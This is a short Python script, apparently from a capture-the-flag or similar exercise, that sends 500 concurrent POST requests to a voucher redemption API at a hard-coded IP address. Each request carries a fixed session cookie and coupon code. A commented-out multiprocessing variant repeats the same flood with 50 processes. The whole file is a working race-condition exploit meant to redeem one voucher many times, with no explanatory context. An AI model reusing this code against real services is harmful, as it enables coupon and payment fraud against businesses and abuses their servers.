import grequests

urls=[]
for i in range(500):        
    urls.append("http://103.152.242.243:21033/api/v1/voucher/redeem")
print(urls)

headers = {"cookie": "sessionid=5uhzoog1nfwfdw0rr9gvy36r9lvgupbv"}
params = {'coupon':'PH9S-DDF7-T02J-CSBV'}
rs = (grequests.post(u, json=params, headers=headers) for u in urls)
o = grequests.map(rs)
print(o)


'''
from requests import post
from multiprocessing import *
import time

def f():
    post("http://103.152.242.243:21033/api/v1/voucher/redeem", headers={
        "cookie": "sessionid=ps4k2xx6jdoagt1xedxd3akawwa2gq43"
    })

for i in range(50):
    p = Process(target=f)
    p.start()
time.sleep(2)
'''